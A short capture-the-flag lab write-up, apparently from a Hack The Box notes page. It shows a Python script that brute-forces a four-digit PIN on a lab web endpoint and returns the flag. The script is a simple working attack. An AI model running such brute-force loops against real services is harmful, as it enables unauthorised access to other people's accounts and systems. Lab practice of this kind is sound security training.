# Brute Force Attacks

After successfully brute-forcing the PIN, what is the full flag the script returns?

This simple lab challenges us to to a simple brute force attack to a web application that requires a PIN for a special access.

To solve this we can you the script provided by the HTB:

{% code overflow="wrap" %}
```python
import requests

ip = "SERVER_IP"  # Change this to your instance IP address
port = SERVER_PORT       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```
{% endcode %}

Make sure to replace the IP e and PORT of your target machine.

Then just run the script and wait for the results:

```bash
python pin-solver.py
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After a while, the script eventually gets the PIN and we find our flag!
